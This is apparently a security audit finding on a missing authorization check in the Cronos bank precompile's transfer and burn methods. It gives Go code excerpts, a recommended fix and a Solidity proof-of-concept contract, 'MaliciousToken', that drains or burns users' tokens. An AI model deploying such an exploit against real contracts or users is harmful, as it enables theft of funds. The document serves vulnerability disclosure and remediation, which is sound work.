### Title
Unauthorized Transfer and Burn of Native Bank Tokens via Missing Sender Authorization in Bank Precompile — (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The bank precompile's `transfer` and `burn` methods accept arbitrary `sender`/`recipient` addresses as call arguments without verifying that the calling contract (`contract.Caller()`) is authorized to act on behalf of those addresses. Any EVM contract can call these methods to transfer or burn native bank tokens of its own denom (`evm/<contractAddress>`) from any user's address without that user's consent.

---

### Finding Description

The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes `mint`, `burn`, `balanceOf`, and `transfer` methods. The native token denom for all operations is derived from the calling contract's address:

```go
denom := EVMDenom(contract.Caller())   // "evm/<callerAddress>"
```

**`transfer` method (lines 167–200):**

```go
sender    := args[0].(common.Address)   // attacker-supplied
recipient := args[1].(common.Address)   // attacker-supplied
amount    := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())    // denom tied to calling contract
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()`. Any contract can pass an arbitrary victim address as `sender` and an attacker-controlled address as `recipient`, causing the bank keeper to move tokens from the victim to the attacker.

**`burn` method (lines 113–156):**

```go
recipient := args[0].(common.Address)   // attacker-supplied (address to burn FROM)
amount    := args[1].(*big.Int)
...
addr  := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

There is **no check** that `addr == contract.Caller()`. Any contract can burn tokens from any user's address.

The intended usage pattern (visible in `TestBank.sol`) is for the contract to pass `msg.sender` as the `sender`/`recipient`, but the precompile itself never enforces this invariant.

---

### Impact Explanation

**Critical — Unauthorized transfer and burn of native bank tokens.**

Any EVM contract that uses the bank precompile to manage a `evm/<contractAddress>` token supply can:

1. **Steal** all user balances: call `bank.transfer(victimAddress, attackerAddress, victimBalance)`.
2. **Destroy** all user balances: call `bank.burn(victimAddress, victimBalance)`.

The denom is scoped to the calling contract, so the attacker can only affect tokens of their own contract's denom. However, any users who hold `evm/<contractAddress>` tokens (e.g., received via `bank.mint` through a DeFi protocol) are fully exposed. This maps directly to the external report's class: an attacker-controlled contract manipulates a trusted primitive to redirect token balances without authorization.

---

### Likelihood Explanation

**High.** The attack requires only:
1. Deploying an EVM contract (unprivileged, permissionless).
2. Inducing users to hold `evm/<contractAddress>` tokens (e.g., by presenting as a legitimate DeFi protocol that mints these tokens as receipts).
3. Calling `bank.transfer` or `bank.burn` with victim addresses as arguments.

No admin keys, governance, or validator compromise is required.

---

### Recommendation

In the `transfer` method, enforce that the `sender` argument equals the calling contract:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

In the `burn` method, enforce that the address to burn from equals the calling contract:

```go
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the calling contract")
}
```

Alternatively, remove the `sender`/`recipient` argument entirely and derive it from `contract.Caller()`, consistent with how `denom` is already derived.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
}

contract MaliciousToken {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Mint tokens to victim (e.g., as part of a "yield" mechanism)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Steal all victim tokens — no victim approval needed
    function steal(address victim, address attacker, uint256 amount) external {
        // bank precompile does NOT check that victim == msg.sender or caller
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim tokens
    function destroy(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

**Attack flow:**
1. Attacker deploys `MaliciousToken`.
2. Users receive `evm/<MaliciousToken>` tokens via `seedVictim` (or any other mechanism).
3. Attacker calls `steal(victimAddress, attackerAddress, victimBalance)`.
4. The bank precompile executes `bankKeeper.SendCoins(victim → attacker)` with no authorization check.
5. All victim balances of `evm/<MaliciousToken>` are drained.
